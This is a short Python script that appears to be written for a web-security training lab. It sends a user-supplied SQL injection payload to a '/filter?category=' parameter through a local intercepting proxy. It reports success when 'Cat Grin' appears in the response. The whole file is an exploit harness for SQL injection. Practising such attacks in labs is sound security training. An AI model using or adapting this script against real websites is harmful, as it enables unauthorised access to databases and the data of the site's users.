import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.0:8080', 'https' : 'http://127.0.0.0:8080'}

def exploit_sqli(url,payload):
    uri = '/filter?category='
    getRequest = requests.get(url + uri + payload, verify=False, proxies=proxies)

    if "Cat Grin" in getRequest.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip();
        payload = sys.argv[2].strip();
    except:
        print("[-] Input error")
        print("[-] usage: %s <url> <payload>" %sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url,payload):
        print("SQLi successful")
    else:
        print("SQLi failed")
